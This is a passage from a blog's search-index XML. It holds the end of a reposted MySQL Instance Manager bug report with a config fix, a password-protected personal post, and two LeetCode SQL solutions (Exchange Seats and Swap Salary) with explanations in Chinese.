<p>Suggested fix:<br>Removing the periods from the mysqld-path entry fixes the problem. </p>
<p>So the my.cnf entry now reads:</p>
<p>[mysqld50026]<br>mysqld-path = /usr/local/mysql50026/bin/mysqld<br>server-id = 1<br>port  = 3306<br>pid-file = /tmp/mysql50026.pid<br>socket  = /tmp/mysql50026.sock<br>datadir  = /usr/local/mysql50026/data</p>
<p>[28 Nov 2006 14:14] Godofredo Miguel Solorzano</p>
<p>Thank you for the bug report. I was unable to repeat with today source<br>repository server on Suse Linux 10:</p>
<p>061128 12:06:19 IM pid file: ‘/tmp/mysqlmanager.pid’; PID: 5758.<br>061128 12:06:20 guardian: starting instance ‘mysqld5032’…<br>061128 12:06:20 starting instance ‘mysqld5032’…<br>061128 12:06:20 accepting connections on ip socket (port: 2273)<br>061128 12:06:20 accepting connections on unix socket ‘/tmp/mysqlmanager.sock’<br>061128 12:06:20  InnoDB: Started; log sequence number 0 43655<br>061128 12:06:21 [Note] /home/miguel/mysql5.0.32/libexec/mysqld: ready for connections.<br>Version: ‘5.0.32-debug’  socket: ‘/tmp/mysql50032.sock’  port: 3306  Source distribution<br>061128 12:06:40 guardian: instance ‘mysqld5032’ is running, set state to STARTED.</p>
<h1 id="转自"><a href="#转自" class="headerlink" title="转自"></a>转自</h1><blockquote>
<ul>
<li><a href="https://bugs.mysql.com/bug.php?id=23808" target="_blank" rel="noopener">Bug #23808 Instance Manager reporting “Too many arguments (first argument is ‘’)”</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>祎诺成长记录</title>
    <url>/2018/09/06/%E6%9D%82%E4%BE%83/life/%E7%A5%8E%E8%AF%BA%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="请输入访问密码">
    <label for="pass">请输入访问密码</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>626. Exchange Seats</title>
    <url>/2018/08/10/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/leetcode/Exchange%20Seats/</url>
    <content><![CDATA[<p>Mary is a teacher in a middle school and she has a table seat storing students’ names and their corresponding seat ids.</p>
<p>The column id is continuous increment.<br>Mary wants to change seats for the adjacent students.<br>Can you write a SQL query to output the result for Mary?</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>id</th>
<th>student</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Abbot</td>
</tr>
<tr>
<td>2</td>
<td>Doris</td>
</tr>
<tr>
<td>3</td>
<td>Emerson</td>
</tr>
<tr>
<td>4</td>
<td>Green</td>
</tr>
<tr>
<td>5</td>
<td>Jeames</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p>For the sample input, the output is:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>id</th>
<th>student</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Doris</td>
</tr>
<tr>
<td>2</td>
<td>Abbot</td>
</tr>
<tr>
<td>3</td>
<td>Green</td>
</tr>
<tr>
<td>4</td>
<td>Emerson</td>
</tr>
<tr>
<td>5</td>
<td>Jeames</td>
</tr>
</tbody>
</table>
</div>
<p>Note:<br>If the number of students is odd, there is no need to change the last one’s seat.<br><a id="more"></a></p>
<h1 id="题意解读"><a href="#题意解读" class="headerlink" title="题意解读"></a>题意解读</h1><p>学生座位信息表,其中id是连续递增的。老师想交换两个相邻学生的座位。如果学生人数是奇数，则无需更改最后一个学生座位。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>mysql </li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">id</span> &lt; (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> seat), <span class="keyword">if</span>(<span class="keyword">id</span> <span class="keyword">mod</span> <span class="number">2</span>=<span class="number">0</span>, <span class="keyword">id</span><span class="number">-1</span>, <span class="keyword">id</span>+<span class="number">1</span>), <span class="keyword">if</span>(<span class="keyword">id</span> <span class="keyword">mod</span> <span class="number">2</span>=<span class="number">0</span>, <span class="keyword">id</span><span class="number">-1</span>, <span class="keyword">id</span>)) <span class="keyword">as</span> <span class="keyword">id</span>, student</span><br><span class="line"><span class="keyword">from</span> seat</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/exchange-seats/description/" target="_blank" rel="noopener">626. Exchange Seats</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>627. Swap Salary</title>
    <url>/2018/08/10/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/leetcode/Swap%20Salary/</url>
    <content><![CDATA[<p>Given a table salary, such as the one below, that has m=male and f=female values. Swap all f and m values (i.e., change all f values to m and vice versa) with a single update query and no intermediate temp table.</p>
<p>For example:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>sex</th>
<th>salary</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>A</td>
<td>m</td>
<td>2500</td>
</tr>
<tr>
<td>2</td>
<td>B</td>
<td>f</td>
<td>1500</td>
</tr>
<tr>
<td>3</td>
<td>C</td>
<td>m</td>
<td>5500</td>
</tr>
<tr>
<td>4</td>
<td>D</td>
<td>f</td>
<td>500</td>
</tr>
</tbody>
</table>
</div>
<p>After running your query, the above salary table should have the following rows:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>sex</th>
<th>salary</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>A</td>
<td>f</td>
<td>2500</td>
</tr>
<tr>
<td>2</td>
<td>B</td>
<td>m</td>
<td>1500</td>
</tr>
<tr>
<td>3</td>
<td>C</td>
<td>f</td>
<td>5500</td>
</tr>
<tr>
<td>4</td>
<td>D</td>
<td>m</td>
<td>500</td>
</tr>
</tbody>
</table>
</div>
<a id="more"></a>
<h1 id="题意解读"><a href="#题意解读" class="headerlink" title="题意解读"></a>题意解读</h1><p>写一个SQL交换性别信息,不能生成临时表。用子查询的话会生成临时表,自然就能想到用CASE WHEN实现。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>mysql</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> salary <span class="keyword">SET</span>  sex = <span class="keyword">case</span> <span class="keyword">when</span> sex=<span class="string">'f'</span> <span class="keyword">then</span> <span class="string">'m'</span> <span class="keyword">else</span> <span class="string">'f'</span> <span class="keyword">end</span> ;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> salary <span class="keyword">set</span> sex = <span class="built_in">CHAR</span>(<span class="keyword">ASCII</span>(<span class="string">'f'</span>) ^ <span class="keyword">ASCII</span>(<span class="string">'m'</span>) ^ <span class="keyword">ASCII</span>(sex));</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/swap-salary/description/" target="_blank" rel="noopener">627. Swap Salary</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
</search>
